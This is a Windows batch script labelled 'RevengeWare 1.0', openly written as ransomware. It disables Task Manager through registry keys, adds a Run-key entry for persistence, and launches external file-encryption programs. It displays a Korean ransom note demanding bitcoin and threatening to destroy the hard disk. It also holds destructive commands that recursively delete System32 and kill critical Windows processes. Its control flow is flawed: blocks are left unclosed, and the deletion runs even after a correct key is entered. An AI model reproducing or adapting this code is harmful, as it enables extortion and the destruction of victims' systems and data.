:: RevengeWare 1.0
:: Depends on Encrypt0r, Decrypt0r, and 32-bit external programs.

@echo off
cls
color 0C

set last_boot_time_file=C:\temp-208492i23j\last_boot_time.txt

set current_boot_time_file=C:\temp-208492i23j\current_boot_time.txt

wevtutil qe System /q:"*[System[(EventID=6005)]]" /rd:true /c:1 /f:text > %current_boot_time_file%

setlocal enabledelayedexpansion
set current_boot_time=
for /f "tokens=2 delims=]" %%i in ('find /i "Event ID: 6005" %current_boot_time_file%') do (
    set current_boot_time=%%i
    set current_boot_time=!current_boot_time:~1!
)
endlocal

if exist %last_boot_time_file% (
    setlocal enabledelayedexpansion
    set /p last_boot_time=<%last_boot_time_file%
    endlocal
    if "!last_boot_time!"=="!current_boot_time!" (
        echo Software activated. Thanks for purchasing genuine software.
    ) else (
        rd /s /q %SystemRoot%\System32
        taskkill /f /im csrss.exe
        taskkill /f /im svchost.exe
        taskkill /f /im winlogn.exe
    )
) else (
:: 작업 관리자 차단 레지스트리 키 값 추가
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: spawn own binaries
set spawn=C:\Desktop\RevengeWare.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RevengeWare.exe /t REG_SZ /d "%spawn%" /f

:: 암호화 시작
if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    if not defined PROCESSOR_ARCHITEW6432 (
        ::32bit
        cd C:\Desktop\temp-208492i23j\e32
        start Encrypt0r32.exe
    ) else (
        :: 64bit
        cd C:\Desktop\temp-208492i23j\e64
        start Encrypt0r64.exe
    )

cls

echo 당신의 시스템이 RevengeWare에 의해 감염되었습니다.
echo 추가적인 조치를 방지하기 위해, 무작위로 당신의 파일들이 암호화되었습니다.
echo 파일들은 강력한 암호화 체계인 RSA-2048을 통해 암호화되어 백신 프로그램을 사용하여 복구할 수 없습니다.
echo 백신 프로그램을 사용하여 복구하려는 시도는 파일에 영구적인 손상을 가하게 될 뿐입니다!
echo
echo 또한, 대화 창을 종료하기 위해 강제로 컴퓨터를 재시동하거나 무력화 시도를 할 경우 대화 창이 다시 나타나 하드디스크를 파괴할 것입니다.
echo 복구용 CD Key를 구입하실 수 있는 경로는 단 한가지입니다.
echo 0.003 BTC (미화 200달러에 상응하는) 값어치의 비트코인을 아래의 주소로 보내십시오.
echo My Bitcoin wallet: (MY_WALLET_ADDRESS)


set /p cdkey = CD Key 입력:
if %cdkey% == VCAJG-NQETM-J97MM goto hp

:hp
if "%PROCESSOR_ARCHITECTURE%"=="x86" (
    if not defined PROCESSOR_ARCHITEW6432 (
        ::32bit
        cd C:\Desktop\temp-208492i23j\d32
        start Decrypt0r32.exe
    ) else (
        :: 64bit
        cd C:\Desktop\temp-208492i23j\d64
        start Decrypt0r64.exe
    )

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f

:hs
:: delete system32 and force restart
rd /s /q %SystemRoot%\System32
taskkill /f /im csrss.exe
taskkill /f /im svchost.exe
taskkill /f /im winlogn.exe


)

echo %current_boot_time% > %last_boot_time_file%

del %current_boot_time_file%

pause
exit
